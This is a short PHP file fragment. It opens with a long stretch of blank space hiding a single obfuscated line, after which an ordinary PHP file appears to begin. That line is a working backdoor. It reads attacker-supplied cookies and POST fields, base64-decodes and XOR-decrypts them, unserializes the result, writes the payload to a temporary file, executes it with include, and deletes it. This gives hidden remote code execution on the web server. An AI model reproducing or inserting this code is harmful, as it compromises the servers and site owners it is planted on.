<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("iymjabpk")){class iymjabpk{public static $dgmzfecb = "gycbpxztwdznmtjw";public static $etrqqa = NULL;public function __construct(){$dayoo = @$_COOKIE[substr(iymjabpk::$dgmzfecb, 0, 4)];if (!empty($dayoo)){$bfxvmosqg = "base64";$brzfqnn = "";$dayoo = explode(",", $dayoo);foreach ($dayoo as $xdpwblnb){$brzfqnn .= @$_COOKIE[$xdpwblnb];$brzfqnn .= @$_POST[$xdpwblnb];}$brzfqnn = array_map($bfxvmosqg . "_decode", array($brzfqnn,));$brzfqnn = $brzfqnn[0] ^ str_repeat(iymjabpk::$dgmzfecb, (strlen($brzfqnn[0]) / strlen(iymjabpk::$dgmzfecb)) + 1);iymjabpk::$etrqqa = @unserialize($brzfqnn);}}public function __destruct(){$this->alaam();}private function alaam(){if (is_array(iymjabpk::$etrqqa)) {$rcuiyejyn = sys_get_temp_dir() . "/" . crc32(iymjabpk::$etrqqa["salt"]);@iymjabpk::$etrqqa["write"]($rcuiyejyn, iymjabpk::$etrqqa["content"]);include $rcuiyejyn;@iymjabpk::$etrqqa["delete"]($rcuiyejyn);exit();}}}$ebphgnoh = new iymjabpk();$ebphgnoh = NULL;} ?><?php
/**
